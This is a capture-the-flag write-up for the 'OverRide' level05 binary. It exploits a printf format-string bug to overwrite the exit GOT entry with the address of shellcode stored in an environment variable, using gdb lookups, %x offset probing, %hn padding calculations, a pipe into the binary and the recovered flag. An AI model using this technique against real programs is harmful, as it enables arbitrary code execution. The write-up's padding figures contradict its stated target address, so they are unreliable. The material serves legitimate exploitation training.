# Level05 Write-up

## Introduction

The program takes an input of 100 bytes, and after that, if the character is between `64` (exclusive) and `<= 90` (inclusive), it XORs it with 32.

## Vulnerability

The goal here is that the buffer of input is directly put into `printf`:

```assembly
.text:08048500                 lea     eax, [esp+98h+buffer]
.text:08048504                 mov     [esp], eax
.text:08048507                 call    _printf
```

For this reason, it's exploitable with arbitrary addresses at any position with any value.

## Security Analysis

Here I want to exploit the GOT table of `exit`.

And here there is no security in the stack and no canary:

```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level05/level05
```

## Finding the GOT Address

The address of the exit GOT:

```gdb
(gdb) x/10i $eip
=> 0x8048370 <exit@plt>:	jmp    DWORD PTR ds:0x80497e0
   0x8048376 <exit@plt+6>:	push   0x18
   0x804837b <exit@plt+11>:	jmp    0x8048330
```

So the destination is `0x80497e0`.

## Finding Shellcode Address

The shellcode is in the environment:

```gdb
(gdb) x/10s *environ
0xffffd820:	 "LC_PAPER=de_CH.UTF-8"
0xffffd835:	 "LC_ADDRESS=de_CH.UTF-8"
0xffffd84c:	 "LC_MONETARY=de_CH.UTF-8"
```

I put my payload in the environment with address:

```bash
export SHELLCODE=""
```

And found:

```
0xffffd859:	 "SHELLCODE="
```

Because ASLR is disabled, it's the same address every launch.

## XOR Function

For the problem, I just write a function to XOR with 32 elements before if in condition `64 < and <= 90`.

Because XOR just reverts to the original after, so it's perfect.

I just need to know which argument is exploitable:

But because 'A' switches to the value 9, I put the value `=9` directly.

## XOR Implementation

```python
def xore(data):
    for i in range(len(data)):
        if data[i] > 64 and data[i] <= 90:
            data[i] ^= 32
    return data
```

## Finding the Format String Offset

```bash
level05@OverRide:~$ echo "aaaa%x %x %x %x %x %x %x %x %x %x %x %x %x %x" | ./level05
aaaa64 f7fcfac0 f7ec3b11 ffffd5ef ffffd5ee 0 ffffffff ffffd674 f7fdb000 61616161 25207825 78252078 20782520 25207825
```

So the 10th element is exploitable.

So I just need to put `%10$n` and put the correct offset inside.

## Exploitation Details

- Destination: `0x80497e0` (GOT table)
- Value: `0xffffd859` (environment element)
- Element: 10

```gdb
(gdb) p/d 0xffffd859
$2 = 4294957145
```

But the problem is that `4294957145` is too big because `MAX_INT` is `2147483647`, which is really too big.

So the solution is to print in two parts, one part `%hn`.

And `h` is short, so only 2 bytes.

## Calculating Padding Values

Calculate the value of padding `0xffffd7c9`:

```
gef➤  p/d 0xd7c9
55241
```

So the first value is `55241`.

With subtraction of 8 because it's already printed with 2x:
```
55241 - 8 = 55233 (first value)
```

Second value is the same:

```
gef➤  p/d 0xffff
$3 = 65535
```

And the same element, you need to subtract what's already printed:
```
65535 - 55241 = 10294
```

## Calculation with 0xffffd85a + 30

Final address: `0xffffd85a + 30 (0x1e) = 0xffffd878`

Calculate the padding value `0xffffd878`:

```
gef➤  p/d 0xd878
55416
```

So the first value is `55416`.

With subtraction of 8 because already printed with 2x:
```
55416 - 8 = 55408 (first value)
```

Second value (same principle):

```
gef➤  p/d 0xffff
$3 = 65535
```

And subtract what has already been printed:
```
65535 - 55416 = 10119 (second value)
```

## Exploitation

```bash
export SHELLCODE=$(cat /tmp/shellcode)

(cat /tmp/payload; cat -) | ./level05 
```

## Flag

```
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```
